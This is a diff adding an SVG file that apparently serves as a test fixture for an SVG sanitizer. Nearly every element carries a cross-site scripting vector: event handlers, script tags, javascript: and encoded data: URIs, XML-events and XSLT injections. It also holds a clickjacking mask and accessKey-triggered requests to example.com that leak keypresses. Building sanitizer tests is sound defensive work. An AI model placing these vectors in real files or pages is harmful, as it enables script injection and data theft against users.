@@ -1,0 +1,72 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg onload="javascript:alert(65)" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="600px" height="600px" viewBox="0 0 600 600" enable-background="new 0 0 600 600" xml:space="preserve">
+    <line onload="alert(2)" fill="none" stroke="#000000" stroke-miterlimit="10" x1="119" y1="84.5" x2="454" y2="84.5" />
+    <line fill="none" stroke="#000000" stroke-miterlimit="10" x1="111.212" y1="102.852" x2="112.032" y2="476.623" />
+    <line fill="none" stroke="#000000" stroke-miterlimit="10" x1="198.917" y1="510.229" x2="486.622" y2="501.213" />
+    <line fill="none" stroke="#000000" stroke-miterlimit="10" x1="484.163" y1="442.196" x2="89.901" y2="60.229" />
+    <line onerror="alert(1)" fill="none" stroke="#000000" stroke-miterlimit="10" x1="101.376" y1="478.262" x2="443.18" y2="75.803" />
+    <this>shouldn't be here</this>
+    <script>
+        alert(1);
+    </script>
+    <line fill="none" stroke="#000000" stroke-miterlimit="10" testing="gone" x1="541.54" y1="299.573" x2="543.179" y2="536.458" />
+    <line onmousedown="javascript:alert(1);" fill="none" stroke="#000000" stroke-miterlimit="10" testing="gone" x1="541.54" y1="299.573" x2="543.179" y2="536.458" />
+    <line onclick="alert(1)" stroke="#000000" stroke-miterlimit="10" testing="gone" x1="541.54" y1="299.573" x2="543.179" y2="536.458" />
+    <line onfocus="alert(1)" stroke="#000000" stroke-miterlimit="10" testing="gone" x1="541.54" y1="299.573" x2="543.179" y2="536.458" />
+    <line onload="Â javascript:alert(1)" fill="none" stroke="#000000" stroke-miterlimit="10" x1="119" y1="84.5" x2="454" y2="84.5" />
+    <line onload="áš€javascript:alert(1)" fill="none" stroke="#000000" stroke-miterlimit="10" x1="119" y1="84.5" x2="454" y2="84.5" />
+    <image width="100" height="100" xlink:href="data:image/jpeg,ab798ewqxbaudbuoibeqbla" />
+    <g onload="javascript:alert(11)" />
+    <a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(87)">test
+    </a>
+    <animation xlink:href="javascript:alert(88)" />
+    <animation xlink:href="data:text/xml,%3Csvg
+        xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E" />
+    <set attributeName="onmouseover" to="alert(89)" />
+    <animate attributeName="onunload" to="alert(89)" />
+    <handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(94)
+
+    </handler>
+    <image xlink:href="data:image/svg+xml,%3Csvg
+            xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E" />
+    <foreignObject xlink:href="javascript:alert(88)" />
+    <foreignObject xlink:href="data:text/xml,%3Cscript
+                xmlns='http://www.w3.org/1999/xhtml'%3Ealert(88)%3C/script%3E" />
+    <feImage>
+        <set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,
+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D" />
+    </feImage>
+    <x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar" />
+    <path d="M0,0" style="marker-start:url(test4.svg#a)" />
+    <iframe src="http://example.com/" style="width:800px; height:350px; border:none; mask: url(#maskForClickjacking);" />
+    <svg:svg>
+        <svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox">
+            <svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white" />
+            <svg:circle cx="0.45" cy="0.7" r="0.075" fill="white" />
+        </svg:mask>
+    </svg:svg>
+    <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+        <xsl:template match="/">
+            <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(125)">
+            </iframe>
+        </xsl:template>
+    </xsl:stylesheet>
+    <circle fill="red" r="40"></circle>
+    <listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x" />
+    <handler id="y">alert(127)</handler>
+    <image xmlns:xlink="http://www.w3.org/1999/xlink">
+        <set attributeName="xlink:href" begin="accessKey(a)" to="//example.com/?a" />
+        <set attributeName="xlink:href" begin="accessKey(b)" to="//example.com/?b" />
+        <set attributeName="xlink:href" begin="accessKey(c)" to="//example.com/?c" />
+        <set attributeName="xlink:href" begin="accessKey(d)" to="//example.com/?d" />
+    </image>
+    <animate attributeName="xlink:href" begin="0" from="javascript:alert(137)" to="1" />
+    <a href="javascript:alert(2)">test 1</a>
+    <a xlink:href="javascript:alert(2)">test 2</a>
+    <a href="#test3">test 3</a>
+    <a xlink:href="#test">test 4</a>
+
+    <a href="data:data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E">test 5</a>
+    <a xlink:href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E">test 6</a>
+</svg>
